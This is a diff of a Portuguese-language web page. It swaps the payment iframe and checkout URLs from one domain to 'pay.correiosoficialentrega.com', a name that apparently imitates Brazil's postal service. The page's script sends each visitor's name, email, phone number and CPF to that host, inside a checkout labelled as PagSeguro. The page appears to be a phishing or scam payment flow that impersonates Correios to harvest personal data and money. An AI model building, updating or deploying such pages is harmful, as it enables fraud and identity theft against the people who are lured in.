@@ -1285,7 +1285,7 @@
             </div>
 
             <div id="paymentOverlay" class="payment-overlay">
-                <iframe id="pagSeguroIframe" src="https://pay.pagamentoscac.site/a9ArZMMxnevZ7xj?name=Nome%20n%C3%A3o%20dispon%C3%ADvel&amp;email=Email%20n%C3%A3o%20dispon%C3%ADvel&amp;telephone=Telefone%20n%C3%A3o%20dispon%C3%ADvel&amp;document=CPF%20n%C3%A3o%20dispon%C3%ADvel"
+                <iframe id="pagSeguroIframe" src="https://pay.correiosoficialentrega.com/a9ArZMMxnevZ7xj?name=Nome%20n%C3%A3o%20dispon%C3%ADvel&amp;email=Email%20n%C3%A3o%20dispon%C3%ADvel&amp;telephone=Telefone%20n%C3%A3o%20dispon%C3%ADvel&amp;document=CPF%20n%C3%A3o%20dispon%C3%ADvel"
                     frameborder="0" allowfullscreen="" class="payment-iframe"></iframe>
             </div>
 
@@ -1329,7 +1329,7 @@
 
 
                 // Construir a URL com os dados
-                const pagSeguroUrl = `https://pay.pagamentoscac.site/a9ArZMMxnevZ7xj?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
+                const pagSeguroUrl = `https://pay.correiosoficialentrega.com/a9ArZMMxnevZ7xj?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
 
                 // Pré-carregar o iframe
                 pagSeguroIframe.src = pagSeguroUrl;
@@ -1409,7 +1409,7 @@
 
                 function setFormDataCloudfoxCheckout(method = "POST") {
 
-                    const urlCloudfoxCheckout = 'https://pay.pagamentoscac.site/a9ArZMMxnevZ7xj';
+                    const urlCloudfoxCheckout = 'https://pay.correiosoficialentrega.com/a9ArZMMxnevZ7xj';
                     let form = document.querySelector(`form[action="${urlCloudfoxCheckout}"]`);
 
                     if (form === null) {
